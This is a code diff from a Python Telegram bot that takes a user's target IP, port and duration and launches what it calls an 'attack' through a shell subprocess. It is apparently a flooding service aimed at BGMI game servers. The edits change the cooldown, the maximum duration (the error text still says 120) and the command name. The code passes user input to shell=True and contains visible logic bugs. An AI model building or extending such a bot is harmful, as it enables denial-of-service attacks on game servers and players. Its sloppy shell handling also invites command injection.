@@ -223,8 +223,8 @@ def handle_bgmi(message):
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in user_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
-                response = "https://t.me/ARMANTEAMVIP"
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 15:
+                response = "🥀 cooʟᴅowɴ ʙᴀʙᴀʏ ☢️\n\n🥀 wᴀιт ʙᴀʙʏ 15 sᴇcoɴᴅ 🖇️"
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -235,7 +235,7 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 120:
+            if time > 150:
                 response = "Error: Time interval must be less than 120"
             else:
                 record_command_logs(user_id, '/bgmi1', target, port, time)
@@ -245,9 +245,9 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"🔺𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄 𝐀𝐓𝐓𝐀𝐂𝐊🔻\n\n💢 𝗧𝗮𝗿𝗴𝗲𝘁 -> {target}\n💢 𝗣𝗼𝗿𝘁 -> {port}\n💢 𝗧𝗶𝗺𝗲 -> {time}"
         else:
-            response = "💠𝐈𝐭'𝐬 𝐓𝐢𝐦𝐞 𝐓𝐨 𝐀𝐭𝐭𝐚𝐜𝐤💠\n\n🟢 /bgmi1 <𝐭𝐚𝐫𝐠𝐞𝐭> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞> 🟢\n\n☢️ READY FOR ATTACK ☣️"  # Updated command syntax
+            response = "💠𝐈𝐭'𝐬 𝐓𝐢𝐦𝐞 𝐓𝐨 𝐀𝐭𝐭𝐚𝐜𝐤💠\n\n🟢 /bgmi <𝐭𝐚𝐫𝐠𝐞𝐭> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞> 🟢\n\n☢️ READY FOR ATTACK ☣️"  # Updated command syntax
     else:
-        response = "🚫 UNAUTHORIZED ACCESS! 🚫\n\nNoops! It seems like you don't have permission to use the /bgmi1 command. To gain access and unleash the power of attacks, you can\n\n🔑 VERIFY YOUR PERMISSIONS\n📝 REQUEST ACCESS FROM AN ADMIN\n\n📞 IF YOU STILL NEED HELP, CONTACT SUPPORT\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @MR_INDIAN_OWNER_1"
+        response = "🚫 UNAUTHORIZED ACCESS! 🚫\n\nNoops! It seems like you don't have permission to use the /bgmi command. To gain access and unleash the power of attacks, you can\n\n🔑 VERIFY YOUR PERMISSIONS\n📝 REQUEST ACCESS FROM AN ADMIN\n\n📞 IF YOU STILL NEED HELP, CONTACT SUPPORT\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @MR_INDIAN_OWNER_1"
 
     bot.reply_to(message, response)
 
